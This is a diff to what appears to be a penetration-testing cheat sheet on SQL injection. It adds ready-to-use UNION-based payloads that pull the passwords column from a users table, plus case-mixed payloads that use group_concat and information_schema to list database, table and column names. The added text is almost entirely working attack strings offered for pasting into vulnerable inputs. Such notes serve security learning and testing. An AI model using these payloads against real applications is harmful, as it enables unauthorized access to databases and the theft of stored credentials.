@@ -58,8 +58,11 @@ See a more detailed [explanation about SQL injection](webexploitation/sql-inject
 
 # 7. Get the value of a selected column (for instance, password)
 1' OR '1'='1' UNION SELECT null,passwords,null,null,null,null FROM users;#
-```
 
+1' OR '1'='1' UNION SELECT null,passwords,null,null,null,null FROM <databaseName.tableName>;#
+
+
+```
 
 Also, once we know which column is injectable, there are some php functions that can provide us some worthy knowing data:
 
@@ -67,6 +70,22 @@ Also, once we know which column is injectable, there are some php functions that
 database()
 user()
 version()
+```
+
+
+Also, interesting payloads for retrieving concatenates values in a UNION based attack:
+
+```
+## Extract database names, table names and column names
+
+#Database names
+-1' UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata
+
+#Tables of a database
+-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema=[database]
+
+#Column names
+-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name=[table name]
 ```
 
 And here an example of how to retrieve them:
